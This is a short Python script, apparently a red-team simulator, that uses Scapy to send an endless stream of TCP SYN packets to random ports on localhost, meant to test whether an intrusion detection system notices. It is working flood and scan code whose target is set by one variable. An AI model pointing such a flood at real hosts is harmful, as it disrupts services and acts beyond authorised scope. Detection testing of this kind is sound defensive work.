"""
Aegis Red Team - Attack Simulator
Simulates a TCP SYN Flood attack to test NIDS detection capabilities.
"""
from scapy.all import IP, TCP, send
import random
import time
import sys

# TARGET CONFIGURATION
TARGET_IP = "127.0.0.1"

def start_attack():
    print(f"==========================================")
    print(f"   AEGIS RED TEAM - ATTACK SIMULATOR")
    print(f"==========================================")
    print(f"[-] Target Locked: {TARGET_IP}")
    print(f"[-] Starting TCP SYN Flood...")
    print(f"[-] Press CTRL+C to stop.\n")

    try:
        # Infinite loop to send packets until user stops
        packet_count = 0
        while True:
            # 1. Generate a random target port (to simulate Port Scanning)
            target_port = random.randint(1024, 65535)
            
            # 2. Create a Fake TCP SYN Packet
            # IP Layer: Destination = Target
            # TCP Layer: Port = Random, Flags = "S" (SYN - Connection Request)
            packet = IP(dst=TARGET_IP)/TCP(dport=target_port, flags="S")
            
            # 3. Send the packet into the network
            # verbose=0: Don't print Scapy's default "Sent 1 packet" message
            send(packet, verbose=0)
            
            packet_count += 1
            print(f"[+] Packet #{packet_count} Sent -> Port: {target_port}")
            
            # 4. Small delay to prevent crashing your own network adapter immediately
            time.sleep(0.05)

    except KeyboardInterrupt:
        print("\n[!] Attack Stopped manually.")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error occurred: {e}")

if __name__ == "__main__":
    start_attack()